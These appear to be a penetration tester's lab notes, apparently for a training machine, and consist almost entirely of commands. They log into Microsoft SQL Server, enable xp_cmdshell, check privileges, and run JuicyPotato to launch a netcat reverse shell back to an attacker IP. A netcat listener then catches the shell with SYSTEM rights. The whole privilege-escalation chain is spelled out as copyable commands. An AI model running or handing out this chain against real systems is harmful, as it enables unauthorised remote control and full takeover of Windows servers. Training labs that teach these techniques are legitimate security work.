
https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py

```shell-session
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

enable xp_cmdshelll
```shell-session
enable_xp_cmdshell
```

confirm access
```shell-session
xp_cmdshell whoami
```

check privs
```shell-session
xp_cmdshell whoami /priv
```


### Run JuicyPotato
if correct privs are there like Impersonate
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

Run NC on kali
```shell-session
sudo nc -lnvp 8443
```

Get ntauthority/system access (admin)

